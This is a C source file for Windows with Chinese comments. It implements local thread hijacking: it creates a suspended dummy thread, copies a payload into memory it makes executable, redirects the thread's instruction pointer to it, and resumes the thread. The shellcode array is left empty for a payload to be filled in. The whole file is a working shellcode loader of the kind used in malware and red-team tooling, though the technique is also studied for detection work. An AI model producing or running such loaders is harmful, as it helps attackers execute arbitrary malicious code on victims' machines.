//本地线程劫持
#include <Windows.h>
#include <stdio.h>

DWORD WINAPI DummyFunction(LPVOID lpParam) {

	printf("Hello from the dummy thread!\n");
	return 0;
}


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID    pAddress = NULL;
	DWORD    dwOldProtection = NULL;
	CONTEXT  ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// 分配有效载荷所需的内存
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAlloc 失败，错误：%d \n", GetLastError());
		return FALSE;
	}

	// 将有效载荷复制到已分配的内存
	memcpy(pAddress, pPayload, sPayloadSize);

	// 更改内存保护
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect 失败，错误：%d \n", GetLastError());
		return FALSE;
	}

	// 获取原始线程上下文
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext 失败，错误：%d \n", GetLastError());
		return FALSE;
	}

	// 更新下一个指令指针与有效载荷地址相等
	ThreadCtx.Rip = pAddress;

	// 更新新线程上下文
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext 失败，错误：%d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

unsigned char buf[] = "";//SHELLCODE

int main() {

	HANDLE hThread = NULL;
	// 创建暂停状态的牺牲线程
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// 劫持创建的牺牲线程
	if (!RunViaClassicThreadHijacking(hThread, buf, sizeof(buf))) {
		return -1;
	}
	// 恢复暂停线程，以便它运行我们的 shellcode
	ResumeThread(hThread);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}
